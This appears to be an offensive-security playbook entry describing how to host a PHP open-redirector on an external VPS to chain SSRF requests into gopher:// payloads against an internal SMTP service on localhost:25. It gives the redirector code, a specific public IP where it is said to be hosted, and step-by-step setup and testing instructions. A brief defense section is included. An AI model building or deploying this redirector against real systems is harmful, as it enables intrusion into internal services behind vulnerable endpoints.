---
id: proc-uuid-3
tags:
  - ssrf-chaining
  - php
  - vps
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/cat-malicious-php-file]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T03:46:09.361Z'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Setup-Chaining-PHP-for-Gopher-Payloads

## Summary

This procedure sets up a simple PHP redirector script on an external VPS to chain SSRF requests, allowing the target to fetch from the VPS which then redirects to internal gopher payloads, bypassing direct protocol restrictions in the vulnerable endpoint.

## Description

Hosted at http://51.178.47.176/o.php, the script <?php $s = $_GET["s"]; header("Location: ".$s); ?> takes a 's' parameter and redirects to it. This is used in the GSA dashboard SSRF to proxy gopher:// to localhost:25 for SMTP. Prerequisites: VPS with PHP/web server (e.g., nginx). Outcomes: Infrastructure ready for SSRF chaining.

## Requirements

1. VPS with PHP and web server installed
2. Public IP for hosting the script
3. Basic file editing capabilities

## Defense

Defensive measures and detection strategies:

- Block outbound requests to unknown external IPs in SSRF-vulnerable functions.
- Scan for redirector patterns in external PHP files via threat intel.
- Monitor VPS hosting for anomalous traffic from target IPs.

## Objectives

1. Create and host the redirector PHP file.
2. Verify script functionality.
3. Enable chaining for internal protocol payloads.

## Instructions

### Step 1: Create PHP File

**Context**: Write the redirector script on the VPS.

Create o.php with contents: <?php $s = $_GET["s"]; header("Location: ".$s); ?>

### Step 2: Verify File Contents

**Context**: Confirm the script is correctly set up.

**Command** ([[commands/cat-malicious-php-file]]):

```bash
cat o.php
```

> Displays the PHP code, ensuring $s parameter handling and header redirect.

### Step 3: Host and Test

**Context**: Place in web root and test accessibility.

Access http://VPS_IP/o.php?s=http://example.com to verify redirect.

> Expected: Browser redirects to example.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/cat-malicious-php-file]]

## Tools Used


## Tags

- [[infrastructure-setup]]
- [[redirector]]
